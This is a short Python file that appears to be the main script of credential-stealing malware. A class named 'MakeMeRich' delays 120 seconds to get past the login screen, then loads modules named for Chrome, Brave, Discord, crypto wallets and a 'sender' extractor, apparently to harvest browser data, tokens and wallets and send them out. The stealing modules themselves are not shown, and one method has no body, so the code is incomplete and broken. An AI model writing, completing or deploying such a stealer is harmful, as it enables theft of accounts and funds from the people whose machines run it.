from chrome import Chrome
from discord import Discord
from brave import Brave
from crypto import CryptoStuff
from time import sleep
from sender import Extract


class MakeMeRich(object):
    def __init__(self) -> None:
        sleep(120)  # time to bypass the login screen
        self.chrome = Chrome()
        self.discord = Discord()
        self.brave = Brave()
        self.extract = Extract()
        self.cryptostuff = CryptoStuff()

    def verify_updates(self):


MakeMeRich()
